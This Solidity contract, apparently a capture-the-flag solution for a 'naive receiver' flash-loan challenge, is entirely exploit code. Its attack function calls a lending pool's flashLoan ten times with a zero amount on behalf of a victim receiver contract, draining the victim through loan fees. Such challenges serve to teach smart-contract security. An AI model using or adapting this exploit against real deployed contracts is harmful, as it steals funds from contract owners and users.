// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

contract AttackNaiveReceiver is Ownable {
  using Address for address;
  address pool;

  constructor (address poolAddress) {
    pool = poolAddress;
  }

  function attack(address naive) public onlyOwner {
    for (int i = 0; i < 10; i++) {
      pool.functionCall(abi.encodeWithSignature("flashLoan(address,uint256)", naive, 0));
    }
  }
}